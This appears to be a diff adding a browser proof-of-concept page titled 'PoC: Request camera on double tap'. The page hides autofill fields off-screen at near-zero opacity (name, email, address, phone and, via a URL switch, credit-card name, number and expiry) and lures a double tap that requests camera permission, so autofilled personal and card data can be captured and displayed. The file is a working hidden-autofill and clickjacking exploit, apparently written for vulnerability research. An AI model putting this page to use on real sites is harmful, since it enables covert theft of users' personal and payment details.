@@ -1,0 +1,104 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+body { overflow: hidden; cursor: pointer; }
+
+input { position: absolute; top: 0; left: -300px; opacity: 0.0001; }
+#inputElem { cursor: pointer; }
+
+#output { padding: 0.2em; background: #eee; }
+#output.success { background: lightgreen; }
+
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+</style>
+</head>
+<body>
+<h1>PoC: Request camera on double tap</h1>
+
+<p id="output">(no output yet...)</p>
+
+<!-- Group 1 -->
+<input id="groupOneElem" name="name" autocomplete="name">
+<input name="email" autocomplete="email">
+<input name="address-line1" autocomplete="address-line1">
+<input name="address-line2" autocomplete="address-line2">
+<input name="city" autocomplete="address-level2">
+<input name="state" autocomplete="address-level1">
+<input name="country-name" autocomplete="country-name">
+<input name="postal-code" autocomplete="postal-code">
+<input name="tel" autocomplete="tel">
+
+<!-- Group 2 -->
+<input id="groupTwoElem" name="cc-name" autocomplete="cc-name">
+<input name="cc-number" autocomplete="cc-number">
+<input name="cc-exp-month" autocomplete="cc-exp-month">
+<input name="cc-exp-year" autocomplete="cc-exp-year">
+
+<p id="instructions">Double tap anywhere to ask for camera permission</p>
+
+<script>
+var inputElem;
+var setMainField = () => {
+  if (window.location.search.indexOf('creditcard') === -1) {
+    var groupOneElem = document.getElementById('groupOneElem');
+    groupOneElem.id = 'inputElem';
+    inputElem = groupOneElem;
+  } else {
+    var groupTwoElem = document.getElementById('groupTwoElem');
+    groupTwoElem.id = 'inputElem';
+    inputElem = groupTwoElem;
+  }
+}
+
+setMainField();
+
+var updateOutput = () => {
+    var inputs = document.querySelectorAll('input');
+    var inputValues = [];
+    inputs.forEach((elem) => {
+       if (elem.value.length) {
+         inputValues.push(elem.value);
+       }
+    });
+    output.innerText = inputValues.join(', ');
+    output.classList.add('success');
+}
+
+inputElem.addEventListener('change', (e) => {
+  if (inputElem.value.length > 0) {
+    setTimeout(() => { updateOutput(); }, 10);
+  }
+});
+
+// Request camera access on double click or double tap
+function requestCameraPermission() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      document.getElementById('output').innerText = "✅ Camera permission granted.";
+      stream.getTracks().forEach(track => track.stop()); // Stop it right after
+    })
+    .catch((err) => {
+      document.getElementById('output').innerText = "❌ Camera permission denied: " + err.name;
+    });
+}
+
+let lastTap = 0;
+
+window.addEventListener('touchstart', (e) => {
+  const currentTime = new Date().getTime();
+  const tapLength = currentTime - lastTap;
+  if (tapLength < 300 && tapLength > 0) {
+    requestCameraPermission();
+  }
+  lastTap = currentTime;
+});
+
+window.addEventListener('dblclick', (e) => {
+  requestCameraPermission();
+});
+</script>
+
+</body>
+</html>
